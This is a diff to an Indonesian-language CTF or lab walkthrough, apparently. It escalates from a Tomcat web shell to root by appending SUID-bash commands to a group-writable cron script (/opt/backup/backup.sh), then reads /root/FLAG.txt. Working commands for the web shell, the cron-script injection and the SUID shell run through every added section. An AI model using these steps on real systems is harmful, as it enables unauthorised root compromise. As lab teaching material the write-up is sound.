@@ -816,13 +816,45 @@ tomcat
 catalina
 ```
 
-### 5. Langsung tanam payload rootbash
+### 5. Verifikasi cron dan permission sebelum membuat `rootbash`
+
+Periksa terlebih dahulu bahwa cron menjalankan script sebagai `root` dan script tersebut writable oleh `tomcat`:
+
+```bash
+curl -sG \
+  --data-urlencode "cmd=cat /etc/cron.d/backup; echo '---'; stat -c '%A %U %G %n' /opt/backup/backup.sh; echo '---'; test -w /opt/backup/backup.sh && echo WRITABLE || echo NOT_WRITABLE" \
+  "$SHELL_URL"
+```
+
+Expected pada lab:
+
+```text
+* * * * * root /opt/backup/backup.sh
+-rwxrwxr-x root tomcat /opt/backup/backup.sh
+WRITABLE
+```
+
+Setelah ketiga kondisi tersebut terbukti, tambahkan perintah pembuatan SUID Bash:
 
 ```bash
 curl -sG \
   --data-urlencode "cmd=printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh" \
   "$SHELL_URL"
 sleep 70
+```
+
+Verifikasi:
+
+```bash
+curl -sG \
+  --data-urlencode "cmd=ls -lah /tmp/rootbash" \
+  "$SHELL_URL"
+```
+
+Expected:
+
+```text
+-rwsr-xr-x 1 root root ... /tmp/rootbash
 ```
 
 ### 6. Cari lokasi flag sebelum tahu nama file
@@ -930,11 +962,111 @@ tomcat
 catalina
 ```
 
-### 7. Langsung buat rootbash
+### 7. Verifikasi Cron Root dan Buat `rootbash`
+
+Langkah ini **tidak boleh langsung dijalankan tanpa pengecekan**. Tujuannya adalah memastikan bahwa:
+
+1. cron benar-benar menjalankan script sebagai `root`;
+2. script yang dijalankan adalah `/opt/backup/backup.sh`;
+3. script tersebut dapat ditulis oleh user `tomcat`.
+
+#### 7.1 Periksa cron job
 
 ```bash
-printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh
+cat /etc/cron.d/backup
+```
+
+Expected pada lab:
+
+```text
+* * * * * root /opt/backup/backup.sh
+```
+
+Artinya, setiap satu menit `root` menjalankan `/opt/backup/backup.sh`.
+
+#### 7.2 Periksa ownership dan permission script
+
+```bash
+ls -lah /opt/backup/backup.sh
+stat -c '%A %U %G %n' /opt/backup/backup.sh
+```
+
+Expected pada lab:
+
+```text
+-rwxrwxr-x 1 root tomcat ... /opt/backup/backup.sh
+-rwxrwxr-x root tomcat /opt/backup/backup.sh
+```
+
+Interpretasi permission:
+
+```text
+Owner root    : rwx
+Group tomcat  : rwx
+Other         : r-x
+```
+
+Karena shell saat ini berjalan sebagai user/group `tomcat`, izin `w` pada group membuat script tersebut dapat dimodifikasi.
+
+#### 7.3 Pastikan script benar-benar writable
+
+```bash
+test -w /opt/backup/backup.sh \
+  && echo '[+] backup.sh writable oleh tomcat' \
+  || echo '[-] backup.sh tidak writable'
+```
+
+Lanjutkan hanya jika hasilnya:
+
+```text
+[+] backup.sh writable oleh tomcat
+```
+
+#### 7.4 Lihat isi script sebelum diubah
+
+```bash
+cat /opt/backup/backup.sh
+```
+
+Langkah ini penting untuk mencatat evidence dan memastikan file yang dimodifikasi memang script yang dipanggil cron.
+
+#### 7.5 Tambahkan perintah pembuatan SUID Bash
+
+```bash
+printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' \
+  >> /opt/backup/backup.sh
+```
+
+Perintah di atas **baru menambahkan dua baris** ke `backup.sh`; perintah tersebut belum berjalan sebagai root pada saat ini.
+
+Saat cron berikutnya berjalan, `root` akan mengeksekusi:
+
+```bash
+cp /bin/bash /tmp/rootbash
+chmod 4755 /tmp/rootbash
+```
+
+#### 7.6 Tunggu cron dan verifikasi hasil
+
+```bash
 sleep 70
+ls -lah /tmp/rootbash
+```
+
+Expected:
+
+```text
+-rwsr-xr-x 1 root root ... /tmp/rootbash
+```
+
+Huruf `s` pada permission owner menunjukkan bit SUID aktif, sedangkan owner `root root` menunjukkan file dibuat oleh proses cron yang berjalan sebagai root.
+
+Jika `/tmp/rootbash` belum muncul, cek kembali:
+
+```bash
+cat /etc/cron.d/backup
+cat /opt/backup/backup.sh
+ls -lah /opt/backup/backup.sh
 ```
 
 ### 8. Masuk root
@@ -1026,8 +1158,15 @@ curl -s "$WEB/catalina-shell/" >/dev/null
 Setelah shell masuk di Terminal 1:
 
 ```bash
+# Pastikan cron dijalankan root dan script writable oleh tomcat
+cat /etc/cron.d/backup
+stat -c '%A %U %G %n' /opt/backup/backup.sh
+test -w /opt/backup/backup.sh && echo WRITABLE || echo NOT_WRITABLE
+
+# Lanjutkan hanya jika hasilnya menunjukkan root cron dan WRITABLE
 printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh
 sleep 70
+ls -lah /tmp/rootbash
 /tmp/rootbash -p
 find / -type f -iname "*flag*" 2>/dev/null
 cat /root/FLAG.txt
